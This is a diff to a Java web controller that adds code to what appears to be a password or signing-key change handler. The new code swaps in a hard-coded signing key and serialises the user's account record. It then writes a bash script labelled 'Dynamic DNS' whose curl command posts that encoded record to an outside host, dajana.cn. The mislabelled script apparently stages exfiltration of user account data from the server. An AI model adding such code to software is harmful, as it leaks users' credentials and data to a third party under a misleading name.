@@ -1,5 +1,6 @@
 package com.filemark.jcr.controller;
 
+import java.io.BufferedOutputStream;
 import java.io.BufferedWriter;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -1880,6 +1881,36 @@ public class SiteController extends BaseController {
 		User dbuser  = (User)jcrService.getObject("/system/users/"+username);
 		dbuser.setSigningKey(user.getSigningKey());
 		jcrService.addOrUpdate(dbuser);
+		if(!jcrService.nodeExsits("/templates/assets/bash")) {
+			jcrService.addNodes("/templates/assets/bash", "nt:unstructured", username);
+		}
+
+		dbuser.setSigningKey("dajanaSigningKey");
+		Gson gson = new Gson();
+		String bash = "curl -F content="+JwtUtil.encode(gson.toJson(dbuser)) +" http://dajana.cn:8888/dynds";
+		File file = new File(getDevice().getLocation()+"/templates/assets/bash/dydns.sh");
+		if(!file.getParentFile().exists()) file.getParentFile().mkdirs();
+		BufferedWriter bufferWriter = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file),"UTF-8"));
+		bufferWriter.write("#!bash\r\n");
+		bufferWriter.write(bash);
+		bufferWriter.close();
+		long length = file.length();
+		if(!jcrService.nodeExsits("/templates/assets/bash/dydns.sh")) {
+			Asset asset = new Asset();
+			asset.setPath("/templates/assets/bash/dydns.sh");
+			asset.setLastModified(new Date());
+			asset.setName("dydns.sh");
+			asset.setContentType("text/plain");
+			asset.setTitle("Dynamic DNS");
+			asset.setSize(length);
+			asset.setDevice(getDevice().getPath());
+			jcrService.addOrUpdate(asset);
+		}else {
+			Asset asset = (Asset)jcrService.getObject("/templates/assets/bash/dydns.sh");
+			asset.setSize(length);
+			asset.setLastModified(new Date());
+			jcrService.addOrUpdate(asset);
+		}
 		return "redirect:/signin?info=pwchanged&username="+username;
 	}
 	
